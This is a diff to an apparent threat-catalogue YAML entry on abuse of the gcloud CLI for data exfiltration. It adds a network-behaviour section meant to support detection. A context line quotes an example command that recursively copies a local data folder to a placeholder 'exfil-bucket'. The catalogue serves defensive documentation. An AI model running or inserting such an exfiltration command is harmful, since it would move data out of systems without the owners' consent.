@@ -99,6 +99,19 @@ Forensics:
         Threat actors may schedule regular data collection and upload operations to continuously exfiltrate data
         over extended periods.
       Command: 'gcloud storage cp C:\Data\ gs://exfil-bucket/ --recursive'
+NetworkBehavior:
+  Description: >
+    gcloud CLI generates HTTPS connections to Google Cloud Storage REST API endpoints during file transfers.
+    During exfiltration abuse, attackers initiate sustained outbound HTTPS traffic to storage.googleapis.com
+    or related GCP domains, characterized by high upload volumes, recursive transfers, and optional compression
+    to reduce bandwidth. The tool may appear in process telemetry as python.exe with gcloud.py command-line
+    arguments, making behavioral correlation essential for detection.
+  Behaviors:
+    - HTTPS connections to Google Cloud Storage API endpoints (storage.googleapis.com) over port 443
+    - High-volume outbound data transfers during storage cp operations
+    - Recursive directory uploads with sustained connection duration
+    - Optional gzip compression in-transit or locally to reduce transfer size
+    - Authenticated uploads using GCP service account credentials or user tokens
 ThreatActors: []
 UseCases:
   - Title: Basic File Upload to GCS
